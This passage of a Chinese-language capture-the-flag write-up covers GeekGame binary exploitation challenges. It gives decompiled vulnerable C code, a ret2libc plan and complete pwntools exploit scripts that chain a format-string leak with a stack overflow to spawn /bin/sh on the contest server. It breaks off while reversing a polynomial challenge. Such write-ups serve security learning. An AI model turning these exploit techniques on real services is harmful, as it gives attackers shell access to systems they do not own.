</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10010</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x401090</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x401080</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
</span></span><span class="line"><span class="cl"><span class="n">main137</span> <span class="o">=</span> <span class="mh">0x401311</span>
</span></span><span class="line"><span class="cl"><span class="n">add_rsp_0x88_ret</span> <span class="o">=</span> <span class="mh">0x401365</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">120</span> <span class="o">+</span> <span class="n">main137</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span> <span class="o">*</span> <span class="mi">112</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">add_rsp_0x88_ret</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span> <span class="o">*</span> <span class="mh">0x88</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">system_plt</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">1</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">ls -al</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-2-2">Flag 2</h4>
<p><code>checksec</code> 显示只开启了 NX</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table>
</div>
</div><p>逆向出源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span><span class="o">*</span> <span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">sVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">s2</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">s1</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;please enter your flag~(less than 0x20 characters)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sVar1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar1</span> <span class="o">&lt;</span> <span class="mh">0x21</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;this is your flag: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">What will you do to capture it?:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;so you want to &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> and your flag again? :&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;go0d_j0b_und_go0d_luck~:)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;byebye~&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>程序先读取一个字符串，如果长度不超过 32，打印出来，并读写两个字符串。</p>
<ul>
<li>存在缓冲区溢出漏洞，可以覆盖返回地址。</li>
<li><code>printf(s1)</code> 存在格式化字符串漏洞，可以泄露栈上的数据。</li>
</ul>
<p>程序中 gadget 很少，所以只能 ret2libc。</p>
<ul>
<li>先读入一个较长的字符串，覆盖返回地址，跳转到 <code>main</code> 函数中间，并设置栈顶为 <code>__isoc99_scanf</code> 的 GOT 项</li>
<li>用短字符串泄露 <code>__isoc99_scanf</code> 的地址，查询 <code>libc.so.6</code>，得到 <code>libc</code> 的基址以及 <code>libc</code> 中的函数地址</li>
<li>再读入一个短字符串</li>
<li>覆盖返回地址，用 <code>libc</code> 中的 gadget 设置 <code>rdi</code> 指向 <code>/bin/sh</code>，再跳转到 <code>system</code> 函数</li>
</ul>
<details open>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># sh = process(&#39;./challenge2&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./challenge2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob09.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10011</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">isoc99_scanf_got</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__isoc99_scanf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">isoc99_scanf_got</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mainAddress</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main22</span> <span class="o">=</span> <span class="n">mainAddress</span> <span class="o">+</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">mainAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span> <span class="o">*</span> <span class="mi">56</span> <span class="o">+</span> <span class="n">main22</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">isoc99_scanf_got</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;please enter your flag~(less than 0x20 characters)&#39;</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%8x</span><span class="s1">.&#39;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;&lt;</span><span class="si">%s</span><span class="s1">&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;please enter your flag~(less than 0x20 characters)&#39;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">addressLine</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">addressLine</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scanfAddressStr</span> <span class="o">=</span> <span class="n">addressLine</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">scanfAddressStr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">scanfAddress</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">scanfAddressStr</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libcScanfOffset</span> <span class="o">=</span> <span class="mh">0x62110</span>
</span></span><span class="line"><span class="cl"><span class="n">libcSystemOffset</span> <span class="o">=</span> <span class="mh">0x50d60</span>
</span></span><span class="line"><span class="cl"><span class="n">libcBinShOffset</span> <span class="o">=</span> <span class="mh">0x1d8698</span>
</span></span><span class="line"><span class="cl"><span class="n">libcPopRdiRetOffset</span> <span class="o">=</span> <span class="mh">0x2a3e5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libcBaseAddress</span> <span class="o">=</span> <span class="n">scanfAddress</span> <span class="o">-</span> <span class="n">libcScanfOffset</span>
</span></span><span class="line"><span class="cl"><span class="n">libcSystemAddress</span> <span class="o">=</span> <span class="n">libcBaseAddress</span> <span class="o">+</span> <span class="n">libcSystemOffset</span>
</span></span><span class="line"><span class="cl"><span class="n">libcBinShAddress</span> <span class="o">=</span> <span class="n">libcBaseAddress</span> <span class="o">+</span> <span class="n">libcBinShOffset</span>
</span></span><span class="line"><span class="cl"><span class="n">libcPopRdiRetAddress</span> <span class="o">=</span> <span class="n">libcBaseAddress</span> <span class="o">+</span> <span class="n">libcPopRdiRetOffset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">scanfAddress</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcBaseAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcSystemAddress</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcBinShAddress</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libcPopRdiRetAddress</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x20</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x09</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x0A</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x0D</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x0B</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="mh">0x0C</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">ic</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">plt</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">plt</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">retAddress</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;33333333&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;What will you do to capture it?:&#39;</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">56</span>
</span></span><span class="line"><span class="cl"><span class="n">payload4</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libcPopRdiRetAddress</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libcBinShAddress</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">retAddress</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libcSystemAddress</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;and your flag again?&#39;</span><span class="p">,</span> <span class="n">payload4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">check</span><span class="p">(</span><span class="n">payload4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload5</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;ls -al&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload2</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload3</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload4</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload5</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<br>
<h3 id="16-绝妙的多项式">16. 绝妙的多项式</h3>
<h4 id="baby">Baby</h4>
<p>逆向出计算部分的源代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl">    <span class="n">mint</span><span class="o">*</span> <span class="n">values</span> <span class="o">=</span> <span class="k">new</span> <span class="n">mint</span><span class="p">[</span><span class="mi">36</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">values</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">36</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mint</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">36</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="n">inputArray</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">mint</span><span class="o">::</span><span class="n">mint</span><span class="p">(</span><span class="o">&amp;</span><span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">36</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">mint</span> <span class="nf">sum</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">mint</span> <span class="nf">product</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
